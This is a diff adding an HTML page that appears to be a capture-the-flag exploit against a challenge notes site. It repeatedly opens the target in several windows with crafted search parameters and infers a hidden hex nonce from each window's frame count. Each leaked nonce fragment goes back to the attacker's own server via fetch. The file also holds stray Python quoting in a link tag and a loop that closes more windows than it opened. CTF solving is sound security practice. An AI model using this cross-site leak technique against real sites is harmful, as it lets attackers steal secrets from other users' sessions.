@@ -1,0 +1,84 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8"><title>x</title>
+<link rel="preconnect" href="""" + CHALL + r"""" crossorigin>
+</head>
+<body>
+<pre id="log">go</pre>
+<script>
+
+  const CHALL = "https://notes.chall.lac.tf";
+  const HEX = '0123456789abcdef';
+  const POLL = 4;
+
+  onload = ()=>{
+    window.wins = []
+    window.procs = []
+    window.nonce = ""
+
+    window.currC = 0;
+    for(i=0;i<POLL;i++)
+    {
+        
+        wins.push(window.open(`${CHALL}?name=x&referrerPolicy=ADFRAME&search=${HEX.charAt(window.currC)}`))
+        
+    }
+    window.location = "#x";
+    
+    
+    function makeFunc(idx){
+        return () => {
+            if (wins[idx].ADFRAME != wins[idx][0]){
+                window.goodC = HEX.charAt(window.currC)
+            }
+            if(window.nonce.length == 8) {debug0()}
+            wins[idx].location = `${CHALL}?name=x&referrerPolicy=ADFRAME&search=${window.nonce}${HEX.charAt(window.currC)}`;
+        }
+    }
+
+
+    window.procs.push( setInterval(()=>{
+        
+        found = false
+        for(i=0;i<POLL;i++)
+        {
+            if(wins[i].ADFRAME != wins[i][0]){
+                found = true
+                break
+            }
+        }
+        if(found) { window.nonce += HEX.charAt((window.currC)%16); fetch(`/nonce_${nonce}`)} 
+        window.currC = ( window.currC+1 )%16 
+        // fetch(`/?q=${currC}`)
+        for(i=0;i<POLL;i++){
+            wins[i].location = `${CHALL}?name=x&referrerPolicy=ADFRAME&search=${window.nonce}${HEX.charAt(window.currC)}`
+            
+        }
+        if(window.nonce.length == 8) {debug0()}
+        
+    
+    },200) )
+    
+
+
+}
+
+
+
+
+  function debug0(){
+    for(i=0;i<16;i++)
+    {
+        wins[i].close()
+    }
+    for(i=0;i<window.procs.length;i++){
+        clearInterval(window.procs[i])
+    }
+}
+</script>
+  <div id="x"></div>
+
+
+</body>
+</html>
